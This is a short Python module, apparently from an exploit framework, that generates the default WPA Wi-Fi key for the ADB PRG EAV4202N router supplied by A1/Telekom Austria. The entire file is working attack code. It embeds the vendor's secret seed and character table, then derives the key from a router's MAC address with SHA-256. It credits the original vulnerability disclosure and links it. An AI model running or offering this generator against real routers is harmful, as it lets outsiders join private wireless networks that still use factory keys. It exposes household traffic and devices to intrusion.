# coding=utf-8
import hashlib

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="A1/Telekom Austria PRG EAV4202N Default WPA Key",
            category="generator",
            authors={
                "Vulnerability discovery": "Stefan Viehboeck",
                "RExploit module": "Daniel Diez"
            },
            targets=[
                "PRG EAV4202N"
            ],
            date="17/02/2014",
            cwe="CWE-310: Cryptographic Issues",
            references={
                "https://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/": "Sviehb"
            },
            description="Generates WPA key for ADB PRG EAV4202N used by A1/Telekom in Austria."
        )

    # This code is work of Ján Trenčanský
    def run(self, mac):
        seed = (b'\x54\x45\x4F\x74\x65\x6C\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
                b'\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x94\x3F\xDC\xE8')

        lookup = '0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz'

        h = hashlib.sha256()
        h.update(seed)
        h.update(mac)
        digest = bytearray(h.digest())
        return ''.join([lookup[x % len(lookup)] for x in digest[0:13]])
